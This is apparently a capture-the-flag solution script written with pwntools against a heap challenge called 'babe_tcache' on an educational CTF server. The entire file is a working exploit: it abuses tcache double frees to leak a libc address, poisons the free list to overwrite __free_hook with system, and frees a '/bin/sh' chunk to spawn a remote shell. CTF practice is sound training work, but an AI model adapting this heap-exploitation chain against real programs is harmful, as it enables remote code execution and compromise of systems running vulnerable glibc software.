from pwn import *

def add(idx,size,content):
	r.sendlineafter(">","1")
	r.sendlineafter(":",str(idx))
	r.sendlineafter(":",str(size))
	r.sendafter(":",content)

def show(idx):
	r.sendlineafter(">","2")
	r.sendlineafter(":",str(idx))


def remove(idx):
	r.sendlineafter(">","3")
	r.sendlineafter(":",str(idx))




#r = process(["./babe_tcache"])

r = remote("edu-ctf.zoolab.org", 7122)

add(0,0x10,"a")
add(1,127,p64(0)+p64(0x501))
for i in range(20):
	add(1,127,p64(0))

remove(0)
remove(0)
add(0,0x10,p8(0x90))
add(0,0x10,"\x00")
add(0,0x10,"a")
remove(0)
add(0,0x10,"a")
show(0)
libc = u64(r.recvline()[1:-1].ljust(8,'\x00'))-0x3ec061
print hex(libc)


add(0,0x30,"a")
remove(0)
remove(0)
add(0,0x30,p64(libc+0x3ed8e8))
add(0,0x30,"/bin/sh\x00")
add(1,0x30,p64(libc+0x4f440))
remove(0)
r.interactive()
